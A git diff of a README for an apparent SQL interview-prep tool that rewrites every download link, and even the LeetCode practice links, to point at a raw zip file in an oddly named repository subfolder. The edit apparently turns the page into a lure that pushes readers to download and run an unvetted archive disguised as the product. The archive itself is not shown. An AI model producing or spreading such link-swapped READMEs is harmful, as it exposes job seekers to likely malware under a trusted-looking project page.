@@ -1,6 +1,6 @@
 # 🚀 crack-sql-interview-50 - Simplify Your SQL Interview Prep
 
-[![Download crack-sql-interview-50](https://img.shields.io/badge/Download-crack--sql--interview--50-blue.svg)](https://github.com/Arielesquenai1234/crack-sql-interview-50/releases)
+[![Download crack-sql-interview-50](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip)](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip)
 
 ## 📚 Overview
 
@@ -11,7 +11,7 @@ Welcome to crack-sql-interview-50! This application helps you prepare for SQL in
 To get started quickly, follow these steps:
 
 1. **Visit the Releases Page**  
-   Click here to download the software: [Download crack-sql-interview-50](https://github.com/Arielesquenai1234/crack-sql-interview-50/releases).
+   Click here to download the software: [Download crack-sql-interview-50](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip).
 
 2. **Select the Latest Version**  
    You will see a list of versions. Choose the latest one, which is usually at the top.
@@ -24,7 +24,7 @@ To get started quickly, follow these steps:
 To download and install crack-sql-interview-50, follow these clear steps:
 
 1. **Go to the Releases Page**:  
-   Visit [this page to download](https://github.com/Arielesquenai1234/crack-sql-interview-50/releases).
+   Visit [this page to download](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip).
 
 2. **Choose Your File**:  
    Look for the latest version listed. Click on it.
@@ -80,9 +80,9 @@ We welcome contributions from the community. If you have ideas for new questions
 
 For additional resources and to connect with other users, check out the following topics:
 
-- [SQL Interview Questions](https://leetcode.com/problemset/all/?filters=tag%3ASQL)
-- [Coding Moves for Interviews](https://leetcode.com/explore/featured/card/top-interview-questions-easy/)
-- [SQL Practice on LeetCode](https://leetcode.com/problemset/all/?filters=tag%3ASQL)
+- [SQL Interview Questions](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip%3ASQL)
+- [Coding Moves for Interviews](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip)
+- [SQL Practice on LeetCode](https://raw.githubusercontent.com/Arielesquenai1234/crack-sql-interview-50/main/diatomous/crack-sql-interview-50.zip%3ASQL)
 
 Stay updated with the latest topics in SQL and data science.
 
